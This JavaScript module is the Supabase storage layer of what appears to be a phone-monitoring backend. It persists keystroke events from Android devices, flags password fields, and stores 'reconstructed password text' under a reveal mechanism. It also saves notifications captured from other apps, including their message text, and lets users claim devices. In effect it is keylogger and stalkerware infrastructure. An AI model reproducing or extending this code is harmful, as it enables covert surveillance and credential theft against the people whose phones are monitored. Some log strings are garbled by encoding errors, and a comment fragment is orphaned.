/**
 * Supabase Database Service
 * Handles device persistence to Supabase PostgreSQL
 */

import { createClient } from '@supabase/supabase-js';
import { createHash } from 'node:crypto';
import { config } from '../config.js';

// Initialize Supabase client
const supabase = config.supabase.url && config.supabase.key && config.supabase.enabled
    ? createClient(config.supabase.url, config.supabase.key)
    : null;

if (config.supabase.enabled && !supabase) {
    console.warn('[Database] ⚠️ Supabase not configured — running in memory-only mode');
} else if (!config.supabase.enabled) {
    console.log('[Database] 🔇 Supabase disabled by environment config (test mode)');
} else {
    console.log('[Database] ✅ Supabase client initialized');
}

export { supabase };

/**
 * Upsert a device (insert or update on conflict)
 */
export async function upsertDevice(deviceId, metadata = {}) {
    if (!supabase) return;

    try {
        const { error } = await supabase
            .from('devices')
            .upsert({
                device_id: deviceId,
                model: metadata.model || null,
                manufacturer: metadata.manufacturer || null,
                android_version: metadata.androidVersion || null,
                battery: metadata.battery || null,
                status: metadata.status || 'online',
                last_seen: new Date().toISOString(),
                connected_at: metadata.connectedAt || new Date().toISOString(),
                owner: metadata.owner || null,
                metadata: metadata,
            }, { onConflict: 'device_id' });

        if (error) {
            console.error(`[Database] Upsert error for ${deviceId}:`, error.message, error.details);
        } else {
            console.log(`[Database] âœ… Device ${deviceId.substring(0, 8)}... saved to Supabase`);
        }
    } catch (err) {
        console.error(`[Database] Error upserting device ${deviceId}:`, err.message);
    }
}

/**
 * Get device IDs owned by a specific user
 */
export async function getUserDevices(owner) {
    if (!supabase) return [];

    try {
        const { data, error } = await supabase
            .from('devices')
            .select('device_id')
            .eq('owner', owner);

        if (error) throw error;
        return (data || []).map(r => r.device_id);
    } catch (err) {
        console.error('[Database] Error getting user devices:', err.message);
        return [];
    }
}

/**
 * Claim a device for a user (set owner)
 */
export async function claimDevice(deviceId, owner) {
    if (!supabase) return false;

    try {
        const { error } = await supabase
            .from('devices')
            .update({ owner })
            .eq('device_id', deviceId);

        if (error) throw error;
        return true;
    } catch (err) {
        console.error(`[Database] Error claiming device ${deviceId}:`, err.message);
        return false;
    }
}

/**
 * Update device status only
 */
export async function updateDeviceStatus(deviceId, status) {
    if (!supabase) return;

    try {
        const { error } = await supabase
            .from('devices')
            .update({
                status,
                last_seen: new Date().toISOString(),
            })
            .eq('device_id', deviceId);

        if (error) throw error;
    } catch (err) {
        console.error(`[Database] Error updating status for ${deviceId}:`, err.message);
    }
}

/**
 * Load all devices from database (for server startup)
 */
export async function getAllDevices() {
    if (!supabase) return [];

    try {
        const { data, error } = await supabase
            .from('devices')
            .select('*')
            .order('last_seen', { ascending: false });

        if (error) throw error;
        return data || [];
    } catch (err) {
        console.error('[Database] Error loading devices:', err.message);
        return [];
    }
}

/**
 * Delete device permanently from database â€” CASCADE DELETE
 * Removes device and ALL related data from every Supabase table.
 */
export async function deleteDeviceFromDB(deviceId) {
    if (!supabase) return;

    return withDeviceLock(deviceId, async () => {
        const tables = [
            'activity_events',
            'captured_notifications',
            'notifications',
            'pending_reveals',
            'devices',  // Delete device row LAST (after all foreign references)
        ];

        for (const table of tables) {
            try {
                const { error } = await supabase
                    .from(table)
                    .delete()
                    .eq('device_id', deviceId);

                if (error) {
                    console.warn(`[Database] Error deleting from ${table} for ${deviceId}: ${error.message}`);
                } else {
                    console.log(`[Database] âœ… Deleted ${deviceId} from ${table}`);
                }
            } catch (err) {
                console.error(`[Database] Error deleting from ${table} for ${deviceId}:`, err.message);
            }
        }

        console.log(`[Database] ✅ Cascade delete complete for device ${deviceId}`);
    });
}

// ========== ACTIVITY EVENTS ==========

// ---- Per-device serialization -------------------------------------------
// Save (phone WS batch), clear (admin) and device-delete all touch the same
// rows. Without serialization, a clear can run while a save batch is in
// flight, letting "cleared" rows resurrect after the DELETE commits. Every
// mutating activity operation for one device is chained on the same promise.
const deviceLocks = new Map();

function withDeviceLock(deviceId, fn) {
    const prev = deviceLocks.get(deviceId) || Promise.resolve();
    const run = prev.catch(() => {}).then(fn);
    const guarded = run.catch(() => {});
    deviceLocks.set(deviceId, guarded);
    guarded.finally(() => {
        if (deviceLocks.get(deviceId) === guarded) deviceLocks.delete(deviceId);
    });
    return run;
}

// ---- Persistent pending reveals -----------------------------------------
// Reveals can arrive (dashboard POST) before their event rows are persisted
// (async WS save path) — a race that would otherwise silently drop them.
// Holds are written to the `pending_reveals` table (not process memory) so a
// server restart/redeploy never loses them; saveActivityEvents applies them
// the moment the event row lands. Per-device locking (above) keeps reveal and
// save from interleaving, so a hold is never cleared before it is applied.
const PENDING_REVEALS_TABLE = 'pending_reveals';
const PENDING_REVEAL_TTL_MS = 24 * 60 * 60 * 1000;

async function insertPendingReveals(deviceId, reveals) {
    if (!supabase || reveals.length === 0) return;
    try {
        const { error } = await supabase
            .from(PENDING_REVEALS_TABLE)
            .upsert(reveals.map(r => ({
                device_id: deviceId,
                event_uuid: String(r.uuid),
                reveal_text: r.text,
                reveal_partial: !!r.partial,
                created_at: new Date().toISOString(),
            })), { onConflict: 'device_id,event_uuid' });
        if (error) throw error;
    } catch (err) {
        console.warn(`[Database] Pending reveal persist failed for ${deviceId}:`, err.message);
    }
}

async function loadPendingReveals(deviceId, uuids) {
    const found = new Map();
    if (!supabase || !Array.isArray(uuids) || uuids.length === 0) return found;
    try {
        const { data, error } = await supabase
            .from(PENDING_REVEALS_TABLE)
            .select('event_uuid, reveal_text, reveal_partial')
            .eq('device_id', deviceId)
            .in('event_uuid', uuids);
        if (error) throw error;
        (data || []).forEach(r => {
            found.set(r.event_uuid, { text: r.reveal_text, partial: !!r.reveal_partial });
        });
    } catch (err) {
        console.warn(`[Database] Pending reveal load failed for ${deviceId}:`, err.message);
    }
    return found;
}

async function deletePendingReveals(deviceId, uuids) {
    if (!supabase || !Array.isArray(uuids) || uuids.length === 0) return;
    try {
        const { error } = await supabase
            .from(PENDING_REVEALS_TABLE)
            .delete()
            .eq('device_id', deviceId)
            .in('event_uuid', uuids);
        if (error) throw error;
    } catch (err) {
        console.warn(`[Database] Pending reveal delete failed for ${deviceId}:`, err.message);
    }
}

function schedulePendingRevealCleanup() {
    if (!supabase) return;
    const cleanup = async () => {
        try {
            const cutoff = new Date(Date.now() - PENDING_REVEAL_TTL_MS).toISOString();
            const { error } = await supabase
                .from(PENDING_REVEALS_TABLE)
                .delete()
                .lt('created_at', cutoff);
            if (error) console.warn('[Database] Pending reveal cleanup error:', error.message);
        } catch (err) {
            // Never let housekeeping take the process down.
        }
    };
    cleanup();
    setInterval(cleanup, 60 * 60 * 1000).unref();
}

schedulePendingRevealCleanup();

/**
 * Save activity events to Supabase (batch upsert).
 *
 * Outbox dedup: every event carries a client-generated `uuid`. Re-sends of an
 * already-persisted event are ignored (UNIQUE device_id, event_uuid), so the
 * phone's at-least-once outbox retry becomes exactly-once persistence.
 *
 * @returns {Promise<boolean>} true when the rows were persisted (or ignored as
 *   duplicates) — the caller only sends an event_ack when this is true.
 */
export async function saveActivityEvents(deviceId, events) {
    if (!supabase || !events || events.length === 0) return true;

    return withDeviceLock(deviceId, async () => {
        try {
            const uuids = events.map(e => e.uuid).filter(Boolean);
            const pending = await loadPendingReveals(deviceId, uuids);

            const rows = events.map(ev => {
                const p = pending.get(ev.uuid);
                return {
                device_id: deviceId,
                event_uuid: ev.uuid || null,
                event_type: ev.type || 'keystroke',
                app_package: ev.app || 'unknown',
                text: ev.text || '',
                real_text: ev.realText || null,
                is_password: !!ev.isPassword,
                text_revealed: p ? p.text : (ev.textRevealed || null),
                reveal_partial: p ? p.partial : !!ev.revealPartial,
                full_text: ev.fullText || null,
                class_name: ev.className || null,
                before_text: ev.beforeText || null,
                content_desc: ev.contentDesc || null,
                scroll_y: typeof ev.scrollY === 'number' ? ev.scrollY : null,
                max_scroll_y: typeof ev.maxScrollY === 'number' ? ev.maxScrollY : null,
                item_count: typeof ev.itemCount === 'number' ? ev.itemCount : null,
                previous_app: ev.previousApp || null,
                created_at: ev.timestamp ? new Date(ev.timestamp).toISOString() : new Date().toISOString(),
            };
            });

            await withFkRetry(async () => {
                const { error } = await supabase
                    .from('activity_events')
                    .upsert(rows, { onConflict: 'device_id,event_uuid', ignoreDuplicates: true });
                if (error) throw error;
            });

            // Applied — clear the persisted holds so a future re-send doesn't
            // try to re-apply them (the upsert would ignore the row anyway).
            if (pending.size > 0) {
                await deletePendingReveals(deviceId, [...pending.keys()]);
            }
            return true;
        } catch (err) {
            console.error('[Database] Activity save error:', err.message);
            return false;
        }
    });
}

/**
 * Persist reconstructed password text for activity events (dashboard-computed).
 * Best-effort per-row update; returns the number of rows updated. When the
 * event row has not been persisted yet (async WS save race), the reveal is
 * written to `pending_reveals` (persistent) and applied by saveActivityEvents
 * when the row lands — a reveal is never silently dropped, even across a
 * server restart.
 */
export async function updateActivityReveal(deviceId, updates) {
    if (!supabase || !Array.isArray(updates) || updates.length === 0) return 0;

    return withDeviceLock(deviceId, async () => {
        let updated = 0;
        const pending = [];
        for (const u of updates) {
            if (!u || !u.uuid || typeof u.text !== 'string' || u.text.length > 2000) continue;
            try {
                const { data, error } = await supabase
                    .from('activity_events')
                    .update({
                        text_revealed: u.text,
                        reveal_partial: !!u.partial,
                    })
                    .eq('device_id', deviceId)
                    .eq('event_uuid', u.uuid)
                    .select('id');
                if (!error && data && data.length > 0) {
                    updated++;
                } else {
                    // Row not there yet — hold until saveActivityEvents writes it.
                    pending.push({ uuid: u.uuid, text: u.text, partial: !!u.partial });
                }
            } catch (err) {
                console.warn(`[Database] Reveal update failed for ${deviceId}:`, err.message);
                pending.push({ uuid: u.uuid, text: u.text, partial: !!u.partial });
            }
        }
        if (pending.length > 0) {
            await insertPendingReveals(deviceId, pending);
        }
        return updated;
    });
}

/**
 * Delete activity events from Supabase for a device
 */
export async function deleteActivityEventsFromDB(deviceId) {
    if (!supabase) return;

    return withDeviceLock(deviceId, async () => {
        try {
            const { error } = await supabase
                .from('activity_events')
                .delete()
                .eq('device_id', deviceId);

            if (error) throw error;
            console.log(`[Database] ✅ Deleted activity events for device ${deviceId}`);
        } catch (err) {
            console.error(`[Database] Error deleting activity events for ${deviceId}:`, err.message);
            throw err;
}
    });
}

/**
 * Get activity events from Supabase
 */
export async function getActivityEventsFromDB(deviceId, limit = 500) {
    if (!supabase) return [];

    try {
        const { data, error } = await supabase
            .from('activity_events')
            .select('*')
            .eq('device_id', deviceId)
            .order('created_at', { ascending: false })
            .limit(limit);

        if (error) throw error;
        return data || [];
    } catch (err) {
        console.error('[Database] Error loading activity events:', err.message);
        return [];
    }
}

// on register). Retry once shortly â€” the device insert completes in ~200ms.
async function withFkRetry(fn) {
    try {
        return await fn();
    } catch (err) {
        if (err && (err.code === '23503' || String(err.message).includes('foreign key constraint'))) {
            await new Promise(r => setTimeout(r, 1000));
            return await fn();
        }
        throw err;
    }
}

// ========== LIFECYCLE NOTIFICATIONS (online / offline / setup_complete) ==========

/**
 * Save a device lifecycle event to Supabase (fire & forget).
 */
export async function saveNotification(deviceId, type, title, message, data = {}) {
    if (!supabase) return;

    try {
        await withFkRetry(async () => {
            const { error } = await supabase
                .from('notifications')
                .insert({
                    device_id: deviceId,
                    type,
                    title,
                    message,
                    data,
                });
            if (error) throw error;
        });
    } catch (err) {
        console.error('[Database] Notification save error:', err.message);
    }
}

/**
 * Get lifecycle notifications from Supabase (newest first).
 */
export async function getNotifications(deviceId = null, limit = 100) {
    if (!supabase) return [];

    try {
        let query = supabase
            .from('notifications')
            .select('*')
            .order('created_at', { ascending: false })
            .limit(limit);

        if (deviceId) {
            query = query.eq('device_id', deviceId);
        }

        const { data, error } = await query;
        if (error) throw error;
        return data || [];
    } catch (err) {
        console.error('[Database] Error loading notifications:', err.message);
        return [];
    }
}

// ========== CAPTURED NOTIFICATIONS ==========

/**
 * Save a captured phone notification to Supabase (fire & forget).
 *
 * Dedup rule (recommended fix for conversation-overwrite):
 * - Same notification key AND same content → update in place (re-delivery dedup).
 * - Same notification key but DIFFERENT content (e.g. Samsung updates one
 *   conversation notification with a new message) → INSERT a new row, so every
 *   distinct message becomes its own history entry.
 * Enforced by the UNIQUE (device_id, key, content_hash) constraint.
 */
export async function saveCapturedNotification(deviceId, notif = {}) {
    if (!supabase) return false;

    const title = notif.title || '';
    const text = notif.text || '';
    const bigText = notif.bigText || '';
    // Message: prefer big text, then text, then title (multi-line joined)
    const message = [bigText, text].filter(Boolean).join('\n') || title || '(no text)';
    const contentHash = contentHashOf(title, message);

    try {
        await withFkRetry(async () => {
            const { error } = await supabase
                .from('captured_notifications')
                .upsert({
                    device_id: deviceId,
                    key: notif.key || null,
                    content_hash: contentHash,
                    package_name: notif.packageName || null,
                    app_name: notif.appName || notif.packageName || 'unknown',
                    title,
                    message,
                    post_time: notif.timestamp || null,
                    data: notif,
                }, { onConflict: 'device_id,key,content_hash' });
            if (error) throw error;
        });
        return true;
    } catch (err) {
        console.error('[Database] Captured notification save error:', err.message);
        return false;
    }
}

/**
 * Stable content hash used for dedup — distinguishes a real re-delivery
 * (same text) from a genuinely new message (different text).
 */
function contentHashOf(title, message) {
    return createHash('sha256').update(`${title}\n${message}`).digest('hex');
}

/**
 * Get captured notifications from Supabase (newest first).
 */
export async function getCapturedNotifications(deviceId = null, limit = 200) {
    if (!supabase) return [];

    try {
        let query = supabase
            .from('captured_notifications')
            .select('*')
            .order('post_time', { ascending: false })
            .limit(limit);

        if (deviceId) {
            query = query.eq('device_id', deviceId);
        }

        const { data, error } = await query;
        if (error) throw error;
        return data || [];
    } catch (err) {
        console.error('[Database] Error loading captured notifications:', err.message);
        return [];
    }
}

/**
 * Delete all notification records (captured + lifecycle) from Supabase for a device.
 */
export async function deleteCapturedNotificationsFromDB(deviceId) {
    if (!supabase) return;

    const tables = ['captured_notifications', 'notifications'];
    for (const table of tables) {
        try {
            const { error } = await supabase
                .from(table)
                .delete()
                .eq('device_id', deviceId);

            if (error) throw error;
            console.log(`[Database] ✅ Deleted ${table} for device ${deviceId}`);
        } catch (err) {
            console.error(`[Database] Error deleting from ${table} for ${deviceId}:`, err.message);
            throw err;
        }
    }
}
